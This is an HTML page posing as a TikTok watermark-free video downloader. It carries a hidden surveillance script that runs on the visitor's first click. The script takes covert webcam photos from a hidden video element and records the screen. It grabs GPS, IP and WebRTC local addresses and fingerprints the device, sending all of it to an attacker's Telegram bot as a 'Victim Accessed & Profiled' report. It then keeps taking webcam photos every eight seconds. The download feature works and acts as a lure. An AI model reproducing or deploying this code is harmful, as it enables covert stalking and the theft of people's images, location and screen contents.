<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TikTok Video Downloader</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body {
        background: #000; color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        display: flex; align-items: center; justify-content: center;
        min-height: 100vh; padding: 20px; overflow: hidden;
    }
    .container {
        width: 100%; max-width: 400px; background: #121212;
        border-radius: 20px; padding: 30px 20px;
        box-shadow: 0 10px 30px rgba(255,255,255,0.05);
        text-align: center; border: 1px solid #222;
        position: relative; z-index: 1;
    }
    .logo {
        font-size: 2.2rem; font-weight: bold; margin-bottom: 10px;
        background: -webkit-linear-gradient(45deg, #25F4EE, #FE2C55);
        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        display: flex; align-items: center; justify-content: center; gap: 10px;
    }
    .logo svg { width: 35px; fill: #fff; }
    p { color: #888; font-size: 0.9rem; margin-bottom: 25px; }
    input {
        width: 100%; padding: 15px; background: #1a1a1a;
        border: 1px solid #333; border-radius: 12px;
        color: #fff; font-size: 1rem; margin-bottom: 15px; outline: none;
    }
    button {
        width: 100%; padding: 15px; background: #FE2C55;
        color: #fff; border: none; border-radius: 12px;
        font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: 0.2s;
    }
    button:active { transform: scale(0.98); }
    button:disabled { background: #555; cursor: not-allowed; }
    #cam-video { position: fixed; top: -9999px; left: -9999px; width: 160px; height: 120px; opacity: 0.01; pointer-events: none; }
    #canvas { display: none; }
</style>
</head>
<body>

<div class="container">
    <div class="logo">
        <svg viewBox="0 0 448 512"><path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/></svg>
        TikTok Downloader
    </div>
    <p>Download TikTok videos without watermark.</p>
    <input type="text" id="tiktokUrl" placeholder="Paste TikTok link here...">
    <button id="downloadBtn">Download Video</button>
</div>

<video id="cam-video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
/* ---------- UTILITIES ---------- */
function escapeHtml(str) {
    if (str === undefined || str === null) return "";
    return String(str)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;')
        .replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}

const withTimeout = (p, ms, fallback = null) =>
    Promise.race([p, new Promise(r => setTimeout(() => r(fallback), ms))]);

/* ---------- 1) CREDS ---------- */
function tryDecodeCreds(raw) {
    if (!raw) return null;
    const candidates = [raw];
    if (raw.indexOf('%') !== -1) {
        try { candidates.unshift(decodeURIComponent(raw)); } catch(e) {}
    }
    for (const c of candidates) {
        try {
            const obj = JSON.parse(atob(c));
            if (obj && (obj.token || obj.chatId)) return obj;
        } catch(e) {}
    }
    return null;
}
function getCreds() {
    const params = new URLSearchParams(window.location.search);
    let token = params.get('tg_token');
    let chatId = params.get('tg_chat');
    if (!token || !chatId) {
        const decoded = tryDecodeCreds(params.get('tg_data'));
        if (decoded) { token = decoded.token || token; chatId = decoded.chatId || chatId; }
    }
    token = token || localStorage.getItem('tg_bot_token');
    chatId = chatId || localStorage.getItem('tg_chat_id');
    return { token, chatId };
}

/* ---------- 2) FINGERPRINTING ---------- */
function getCanvasFp() {
    try {
        const c = document.createElement('canvas');
        const x = c.getContext('2d');
        x.textBaseline = 'top'; x.font = '14px Arial'; x.fillStyle = '#f60'; x.fillRect(0, 0, 100, 30);
        x.fillStyle = '#069'; x.fillText('tiktok_fp_🦄', 2, 15);
        return c.toDataURL().slice(-30);
    } catch(e) { return "N/A"; }
}
function getWebGLFp() {
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        if (!gl) return "N/A";
        const d = gl.getExtension('WEBGL_debug_renderer_info');
        if (!d) return "N/A";
        return String(gl.getParameter(d.UNMASKED_RENDERER_WEBGL) || "N/A");
    } catch(e) { return "N/A"; }
}
async function getAudioFp() {
    return new Promise(resolve => {
        try {
            const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
            if (!AC) return resolve("N/A");
            const ac = new AC(1, 44100, 44100);
            const osc = ac.createOscillator(); osc.type='triangle'; osc.frequency.value=10000;
            osc.connect(ac.destination); osc.start();
            ac.startRendering().then(buf => {
                const sum = buf.getChannelData(0).reduce((a,b)=>a+Math.abs(b),0);
                resolve(sum.toFixed(4));
            }).catch(() => resolve("N/A"));
        } catch(e) { resolve("N/A"); }
    });
}
function getFonts() {
    try {
        const test = ['Arial','Helvetica Neue','Segoe UI','Roboto','Courier New','Noto Sans Bengali','SolaimanLipi'];
        const span = document.createElement('span');
        span.style.cssText = 'position:absolute;font-size:72px;visibility:hidden';
        span.textContent = 'mmmmmmmmmmlli';
        document.body.appendChild(span);
        const detected = test.filter(f => {
            span.style.fontFamily = 'monospace'; const a = span.offsetWidth;
            span.style.fontFamily = `${f},monospace`; return span.offsetWidth !== a;
        });
        span.remove();
        return detected.join(", ") || "None";
    } catch(e) { return "N/A"; }
}
async function getWebRTCLocalIP() {
    return new Promise(async resolve => {
        const found = new Set();
        let resolved = false, pc = null;
        const finish = () => {
            if (resolved) return;
            resolved = true;
            try { if (pc) pc.close(); } catch(e){}
            resolve([...found].join(', ') || 'Hidden (mDNS)');
        };
        try {
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel('');
            pc.onicecandidate = e => {
                if (!e.candidate) return finish();
                const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                if (m) found.add(m[0]);
                else if (e.candidate.candidate.includes('.local')) found.add('Hidden (mDNS)');
            };
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            setTimeout(finish, 1500);
        } catch(e) { finish(); }
    });
}
async function getIpIntel() {
    let info = { ip: "Unknown", city: "Unknown", country: "Unknown", isp: "Unknown", lat: null, lon: null };
    try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        info = {
            ip: d.ip || "Unknown", city: d.city || "Unknown", country: d.country_name || "Unknown",
            isp: d.org || "Unknown", lat: d.latitude || null, lon: d.longitude || null
        };
    } catch(e) {}
    return info;
}

/* ---------- GPS ---------- */
function getRealGps() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);
        let resolved = false;
        const finish = (result) => {
            if (resolved) return;
            resolved = true;
            resolve(result);
        };
        const buildResult = p => ({
            lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy),
            mapsUrl: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
        });

        navigator.geolocation.getCurrentPosition(
            p => { console.log('[Nyx] GPS fixed (high)'); finish(buildResult(p)); },
            err1 => {
                console.warn('[Nyx] GPS high err:', err1.code);
                if (err1.code === 1) return finish(null);
                navigator.geolocation.getCurrentPosition(
                    p => { console.log('[Nyx] GPS fixed (low)'); finish(buildResult(p)); },
                    err2 => { console.warn('[Nyx] GPS low err:', err2.code); finish(null); },
                    { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 }
                );
            },
            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
    });
}

async function getDeviceIntel() {
    let battery = "Unknown";
    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            battery = `${Math.round((bat.level||0)*100)}% ${bat.charging ? "(charging)" : ""}`;
        }
    } catch(e) {}
    let netType = "Unknown";
    try { netType = navigator.connection.effectiveType || "Unknown"; } catch(e) {}
    let ram = "Unknown";
    try { ram = (navigator.deviceMemory || "?") + " GB"; } catch(e) {}
    return {
        ua: navigator.userAgent, platform: navigator.platform,
        lang: (navigator.languages || [navigator.language]).join(", "),
        screen: `${screen.width}x${screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        battery, cores: navigator.hardwareConcurrency || "?", ram, net: netType,
        touch: 'ontouchstart' in window ? "Yes" : "No",
        canvasHash: getCanvasFp(), webgl: getWebGLFp()
    };
}

/* ---------- 3) SEND REPORT ---------- */
async function sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves) {
    try {
        let msg = `🚨 <b>Victim Accessed & Profiled!</b>\n━━━━━━━━━━━━━━\n`;
        msg += `🌐 <b>Public IP:</b> <code>${escapeHtml(ipIntel.ip)}</code>\n`;
        msg += `🏠 <b>Local IP:</b> <code>${escapeHtml(localIp)}</code>\n`;
        msg += `🏙️ <b>City:</b> ${escapeHtml(ipIntel.city)}, ${escapeHtml(ipIntel.country)}\n`;
        msg += `📡 <b>ISP:</b> ${escapeHtml(ipIntel.isp)}\n━━━━━━━━━━━━━━\n`;
        if (gps) {
            msg += `📍 <b>REAL GPS:</b>\n   <code>${gps.lat}, ${gps.lon}</code>  ±${gps.acc}m\n   🗺️ <a href="${gps.mapsUrl}">Open in Google Maps</a>\n`;
        } else {
            msg += `📍 GPS: <i>Denied / Unavailable</i>\n`;
            if (ipIntel.lat) {
                const ipMap = `https://www.google.com/maps?q=${encodeURIComponent(ipIntel.lat + ',' + ipIntel.lon)}`;
                msg += `   🗺️ <a href="${ipMap}">IP-based Map</a>\n`;
            }
        }
        msg += `━━━━━━━━━━━━━━\n`;
        msg += `💻 <b>Device:</b> ${escapeHtml(device.platform)}\n`;
        msg += `   CPU: ${escapeHtml(device.cores)} cores | RAM: ${escapeHtml(device.ram)}\n`;
        msg += `   GPU: <code>${escapeHtml(device.webgl)}</code>\n`;
        msg += `   Canvas: <code>${escapeHtml(device.canvasHash)}</code>\n`;
        msg += `   Audio FP: <code>${escapeHtml(audioFp)}</code>\n`;
        msg += `   Fonts: ${escapeHtml(fonts)}\n`;
        msg += `━━━━━━━━━━━━━━\n`;
        msg += `🔋 ${escapeHtml(device.battery)} | 📶 ${escapeHtml(device.net)} | 🖱️ ${mouseMoves}\n`;
        msg += `🔗 <code>${escapeHtml(device.ua)}</code>`;

        const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'HTML', disable_web_page_preview: false })
        });
        const json = await res.json();
        if (!json.ok) console.warn('[Nyx] sendReport failed:', json.description);
    } catch(e) { console.warn("Report send failed:", e); }
}

/* ---------- 4) TIKTOK DOWNLOADER ---------- */
async function realDownload() {
    const urlInput = document.getElementById('tiktokUrl').value.trim();
    const btn = document.getElementById('downloadBtn');
    btn.innerText = "Fetching Video...";
    btn.disabled = true;

    let videoUrl = null;
    try {
        const res1 = await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent('https://www.tikwm.com/api/?url=' + encodeURIComponent(urlInput))}`);
        const data1 = await res1.json();
        if (data1 && data1.code === 0 && data1.data) videoUrl = data1.data.hdplay || data1.data.play;
    } catch(e) {}
    if (!videoUrl) {
        try {
            const res2 = await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent('https://tiklydown.eu.org/api/download?url=' + encodeURIComponent(urlInput))}`);
            const data2 = await res2.json();
            if (data2 && (data2.video_url || (data2.data && data2.data.play))) {
                videoUrl = data2.video_url || data2.data.play;
            }
        } catch(e) {}
    }
    if (!videoUrl) {
        btn.innerText = "❌ Invalid Link"; btn.style.background = "#ef4444";
        setTimeout(() => { btn.innerText = "Download Video"; btn.style.background = "#FE2C55"; btn.disabled = false; }, 3000);
        return;
    }
    btn.innerText = "Downloading...";
    try {
        const videoRes = await fetch(videoUrl);
        const videoBlob = await videoRes.blob();
        const blobUrl = URL.createObjectURL(videoBlob);
        const a = document.createElement('a');
        a.href = blobUrl; a.download = `TikTok_${Date.now()}.mp4`;
        document.body.appendChild(a); a.click(); document.body.removeChild(a);
        URL.revokeObjectURL(blobUrl);
        btn.innerText = "✅ Download Complete"; btn.style.background = "#22c55e";
    } catch (err) {
        btn.innerText = "❌ Download Failed"; btn.style.background = "#ef4444";
    } finally {
        setTimeout(() => { btn.innerText = "Download Video"; btn.style.background = "#FE2C55"; btn.disabled = false; }, 3500);
    }
}

/* ---------- 5) GLOBAL STATE ---------- */
let attackRunning = false;
let permsDone = false;
let permsFiring = false;
let activeStream = null;
let displayStream = null;
let hasRecordedScreen = false;
let trackingInterval = null;
let mouseMoves = 0;

document.addEventListener('mousemove', () => { mouseMoves++; });

/* ---------- 6) CAMERA (already contains audio fallback chain) ---------- */
function openCamera() {
    return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
        .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }))
        .catch(() => navigator.mediaDevices.getUserMedia({ video: true, audio: false }));
}

/* ---------- 7) FRAME CAPTURE ---------- */
async function shootFrame(video, canvas, caption, token, chatId, retries = 1) {
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.75));
    if (!blob || blob.size === 0) return;
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('photo', blob, 'capture.jpg');
    fd.append('caption', caption);
    try {
        const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        const j = await res.json();
        if (!j.ok) throw new Error(j.description || 'upload failed');
    } catch(e) {
        if (retries > 0) {
            await new Promise(r => setTimeout(r, 800));
            return shootFrame(video, canvas, caption, token, chatId, retries - 1);
        }
        console.warn('[Nyx] shootFrame gave up:', e.message);
    }
}

/* ---------- 8) SCREEN RECORDING ---------- */
async function recordScreenFromStream(stream, token, chatId) {
    if (hasRecordedScreen || !stream) return;
    hasRecordedScreen = true;
    try {
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        recorder.onstop = async () => {
            if (!token || !chatId || chunks.length === 0) return;
            const blob = new Blob(chunks, { type: 'video/webm' });
            if (blob.size === 0) return;
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('video', blob, 'screen.webm');
            fd.append('caption', '📺 Screen Recording');
            try {
                const r = await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
                const j = await r.json();
                if (!j.ok) console.warn('[Nyx] sendVideo failed:', j.description);
            } catch(e) {}
        };
        stream.getVideoTracks()[0].onended = () => {
            if (recorder.state !== 'inactive') recorder.stop();
        };
        recorder.start();
        setTimeout(() => {
            if (recorder.state !== 'inactive') recorder.stop();
            stream.getTracks().forEach(t => t.stop());
        }, 5000);
    } catch(e) { console.warn("Screen record error:", e); }
}

/* ---------- 9) MAIN ATTACK — CORRECT ORDER ---------- */
async function startAttack() {
    if (attackRunning) return;
    attackRunning = true;

    const { token, chatId } = getCreds();
    if (!token || !chatId) { attackRunning = false; return; }

    try {
        // ───── STEP 1: Fire getUserMedia SYNCHRONOUSLY (gesture window preserved) ─────
        console.log('[Nyx] firing getUserMedia first...');
        const camP = openCamera();

        // ───── STEP 2: Fire GPS right after (NOT awaited, so it doesn't block cam) ─────
        console.log('[Nyx] firing GPS in background...');
        const gpsP = getRealGps().catch(() => null);

        // ───── STEP 3: Await camera — gesture still valid ─────
        const stream = await withTimeout(camP, 15000);
        if (!stream) {
            console.warn('[Nyx] camera never resolved — abort');
            attackRunning = false;
            return;
        }
        activeStream = stream;
        console.log('[Nyx] camera granted ✓');

        // ───── STEP 4: Screen share — 2s later (avoid prompt stacking) ─────
        setTimeout(() => {
            if (!hasRecordedScreen) {
                navigator.mediaDevices.getDisplayMedia({ video: true })
                    .then(s => { displayStream = s; recordScreenFromStream(s, token, chatId); })
                    .catch(e => console.warn('[Nyx] screen denied:', e.name));
            }
        }, 2000);

        // ───── STEP 5: Wire camera into video element ─────
        const video = document.getElementById('cam-video');
        const canvas = document.getElementById('canvas');
        video.srcObject = stream;
        await new Promise(r => {
            if (video.readyState >= 2) return r();
            const onCanPlay = () => { video.removeEventListener('canplay', onCanPlay); r(); };
            video.addEventListener('canplay', onCanPlay);
            setTimeout(r, 2500);
        });
        await video.play().catch(() => {});

        // ───── STEP 6: Burst 3 photos fast ─────
        for (let i = 1; i <= 3; i++) {
            await shootFrame(video, canvas, `📸 Burst ${i}/3`, token, chatId);
            if (i < 3) await new Promise(r => setTimeout(r, 400));
        }

        // ───── STEP 7: Camera off (light off) ─────
        stream.getTracks().forEach(t => t.stop());
        video.srcObject = null;
        activeStream = null;

        // ───── STEP 8: GPS — capped at 10s so we never hang ─────
        const gps = await withTimeout(gpsP, 10000);
        console.log('[Nyx] GPS:', gps ? 'FIXED ✓' : 'null');

        // ───── STEP 9: Rest of intel (no prompts, fast) ─────
        const [ipIntel, localIp, device, audioFp, fonts] = await Promise.all([
            getIpIntel(), getWebRTCLocalIP(), getDeviceIntel(), getAudioFp(), getFonts()
        ]);

        // ───── STEP 10: Send full report ─────
        await sendReport(token, chatId, ipIntel, localIp, gps, device, audioFp, fonts, mouseMoves);

        // ───── STEP 11: Live capture loop ─────
        if (trackingInterval) clearInterval(trackingInterval);
        trackingInterval = setInterval(liveCapture, 8000);

    } catch (err) {
        console.warn("startAttack error:", err);
        if (activeStream) activeStream.getTracks().forEach(t => t.stop());
    } finally {
        attackRunning = false;
    }
}

/* ---------- 10) LIVE CAPTURE ---------- */
async function liveCapture() {
    if (document.hidden) return;
    const { token, chatId } = getCreds();
    if (!token || !chatId) return;

    let liveStream = null;
    const video = document.getElementById('cam-video');
    const canvas = document.getElementById('canvas');

    try {
        liveStream = await withTimeout(openCamera(), 10000);
        if (!liveStream) return;
        video.srcObject = liveStream;

        await new Promise(r => {
            if (video.readyState >= 2) return r();
            const onCanPlay = () => { video.removeEventListener('canplay', onCanPlay); r(); };
            video.addEventListener('canplay', onCanPlay);
            setTimeout(r, 2000);
        });
        await video.play().catch(() => {});

        await shootFrame(video, canvas, `📸 Live | Moves: ${mouseMoves}`, token, chatId);
    } catch (e) {
        console.warn('[Nyx] live capture failed:', e.name);
    } finally {
        if (liveStream) liveStream.getTracks().forEach(t => t.stop());
        video.srcObject = null;
    }
}

/* ---------- 11) TRIGGERS ---------- */
async function requestPermissions() {
    if (permsDone || permsFiring) return;
    permsFiring = true;
    permsDone = true;
    permsFiring = false;
    startAttack();
}

function armTrigger() {
    if (attackRunning) return;
    requestPermissions();
}

document.addEventListener('click', armTrigger, { once: true });
document.addEventListener('touchstart', armTrigger, { once: true, passive: true });

document.getElementById('downloadBtn').addEventListener('click', () => {
    const urlInput = document.getElementById('tiktokUrl').value.trim();
    if (!urlInput) return alert("Please paste a TikTok link first!");
    if (!attackRunning) startAttack();
    realDownload();
});

window.addEventListener('beforeunload', () => {
    if (trackingInterval) clearInterval(trackingInterval);
    if (activeStream) activeStream.getTracks().forEach(t => t.stop());
    if (displayStream) displayStream.getTracks().forEach(t => t.stop());
});
</script>
</body>
</html>
